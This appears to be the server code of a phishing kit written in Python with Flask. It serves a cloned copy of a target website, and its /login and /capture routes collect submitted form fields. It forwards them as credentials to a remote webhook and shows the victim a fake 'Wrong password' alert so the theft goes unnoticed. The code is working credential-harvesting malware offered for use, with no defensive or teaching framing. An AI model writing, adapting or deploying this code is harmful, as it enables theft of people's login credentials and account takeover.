def start_server():
    app.run(host='0.0.0.0', port=int(port), debug=False, threaded=True)

app = Flask(__name__, static_folder=site_dir)

@app.route('/')
def index():
    return send_from_directory(site_dir, 'index.html')

@app.route('/css/<path:filename>')
def serve_css(filename):
    return send_from_directory(f"{site_dir}/css", filename)

@app.route('/js/<path:filename>')
def serve_js(filename):
    return send_from_directory(f"{site_dir}/js", filename)

@app.route('/images/<path:filename>')
def serve_images(filename):
    return send_from_directory(f"{site_dir}/images", filename)

@app.route('/login', methods=['POST'])
def login():
    creds = dict(request.form)
    try:
        msg = f"**🎯 EXACT COPY - {target}**\n"
        msg += "\n".join([f"`{k}`: `{v}`" for k, v in creds.items()])
        requests.post(webhook, json={"content": msg}, timeout=5)
        print(f"Credentials: {creds}")
    except:
        pass
    return '<script>alert("Wrong password"); location.href="/";</script>'

@app.route('/capture', methods=['POST'])
def capture():
    creds = request.json
    try:
        msg = f"**🎯 AJAX - {target}**\n"
        msg += "\n".join([f"`{k}`: `{v}`" for k, v in creds.items()])
        requests.post(webhook, json={"content": msg}, timeout=5)
        print(f"AJAX: {creds}")
    except:
        pass
    return '', 200

